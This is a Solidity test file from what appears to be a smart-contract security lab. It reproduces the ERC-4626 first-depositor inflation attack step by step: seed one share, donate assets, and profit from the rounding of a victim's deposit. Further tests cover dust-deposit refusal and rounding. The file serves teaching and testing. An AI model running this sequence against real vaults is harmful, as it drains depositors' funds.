// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Lab} from "./Lab.sol";
import {Token} from "../src/Token.sol";
import {Vault} from "../src/Vault.sol";

/// @notice The ERC-4626 share-price attacks, performed rather than described.
contract VaultTest is Lab {
    /// The address `Vault` expects its asset at, fixed so the vault needs no
    /// constructor and can be placed directly into genesis.
    address internal constant ASSET = 0x00000000000000000000000000000000c0dE0020;

    Token internal token;
    Vault internal vault;

    address internal attacker = address(0xBAD);
    address internal victim = address(0xA11CE);

    function setUp() public {
        // Put a real Token at the address the vault has hard-coded, the same
        // way Cupel's genesis does.
        Token deployed = new Token();
        vm.etch(ASSET, address(deployed).code);
        token = Token(ASSET);

        vault = new Vault();

        token.mint(attacker, 10_000e18);
        token.mint(victim, 10_000e18);

        vm.prank(attacker);
        token.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        token.approve(address(vault), type(uint256).max);
    }

    // --- the inflation attack -------------------------------------------------

    /// @notice The classic first-depositor attack, start to finish.
    ///
    /// The attacker seeds the empty vault with a single share, then *donates*
    /// assets straight to it — a plain transfer, not a deposit, so no shares are
    /// minted and the price of the one existing share rockets. The next
    /// depositor's stake is then divided by that inflated price and rounded
    /// down, and the remainder is left behind for the attacker to redeem.
    function test_inflationAttack_victimLosesValueToTheAttacker() public {
        // 1. Seed the vault with the smallest possible position.
        vm.prank(attacker);
        vault.deposit(1, attacker);
        assertEq(vault.totalSupply(), 1, "attacker holds the only share");

        // 2. Donate. This is the move: it changes totalAssets without changing
        //    totalSupply, so one share is now worth a fortune.
        vm.prank(attacker);
        token.transfer(address(vault), 1_000e18);
        assertEq(vault.totalAssets(), 1_000e18 + 1, "assets rose, supply did not");

        // 3. The victim deposits 2000, but the share price says that is worth
        //    1.999… shares, and the division rounds down to 1.
        vm.prank(victim);
        uint256 victimShares = vault.deposit(2_000e18, victim);
        assertEq(victimShares, 1, "the victim's 2000 bought a single share");

        // 4. Two shares now split 3000 assets evenly, so each is worth 1500 —
        //    but the victim paid 2000 for theirs and the attacker paid 1000.
        vm.prank(victim);
        uint256 victimGot = vault.redeem(1, victim, victim);
        assertEq(victimGot, 1_500e18 + 0, "the victim redeems 1500 of their 2000");

        vm.prank(attacker);
        uint256 attackerGot = vault.redeem(1, attacker, attacker);

        // The attacker put in 1000 + 1 wei and takes out 1500.
        assertGt(attackerGot, 1_000e18, "the attacker came out ahead");
        assertEq(attackerGot + victimGot, 3_000e18 + 1, "nothing was created, only moved from victim to attacker");
    }

    /// @notice The protection this vault does have.
    ///
    /// Once the price is inflated, a deposit small enough to round down to zero
    /// shares is refused outright. A naive implementation would take the assets
    /// and mint nothing, which is simply theft.
    function test_inflationAttack_dustDepositIsRefusedNotStolen() public {
        vm.prank(attacker);
        vault.deposit(1, attacker);
        vm.prank(attacker);
        token.transfer(address(vault), 1_000e18);

        uint256 balanceBefore = token.balanceOf(victim);

        vm.prank(victim);
        vm.expectRevert(Vault.ZeroShares.selector);
        vault.deposit(1_000e18 / 2, victim);

        assertEq(token.balanceOf(victim), balanceBefore, "the victim kept their assets");
    }

    // --- rounding -------------------------------------------------------------

    /// @notice Depositing and immediately redeeming must never be profitable.
    ///
    /// If it were, the trade could be repeated until the vault was empty. Both
    /// conversions round down, which is what makes the round trip lossy rather
    /// than free.
    function test_rounding_aRoundTripNeverGains() public {
        vm.prank(attacker);
        vault.deposit(1_000e18, attacker);

        // Make the share price a number that does not divide evenly.
        vm.prank(attacker);
        token.transfer(address(vault), 333);

        uint256 before = token.balanceOf(victim);
        vm.prank(victim);
        uint256 shares = vault.deposit(777e18, victim);
        vm.prank(victim);
        vault.redeem(shares, victim, victim);

        assertLt(token.balanceOf(victim), before + 1, "a round trip cannot profit");
    }

    /// @notice On an empty vault the rate is one to one, because there is no
    ///         supply to divide by.
    function test_firstDepositIsOneToOne() public {
        vm.prank(victim);
        uint256 shares = vault.deposit(100e18, victim);
        assertEq(shares, 100e18, "first deposit mints at par");
        assertEq(vault.totalAssets(), 100e18, "assets match");
    }

    /// @notice A donation raises the price for everyone already holding shares.
    ///         This is the mechanism yield uses — and the one the attack abuses.
    function test_donationRaisesThePriceForExistingHolders() public {
        vm.prank(victim);
        vault.deposit(100e18, victim);

        uint256 worthBefore = vault.convertToAssets(100e18);
        vm.prank(attacker);
        token.transfer(address(vault), 50e18);
        uint256 worthAfter = vault.convertToAssets(100e18);

        assertEq(worthBefore, 100e18, "before the donation");
        assertEq(worthAfter, 150e18, "the holder gained the whole donation");
    }
}
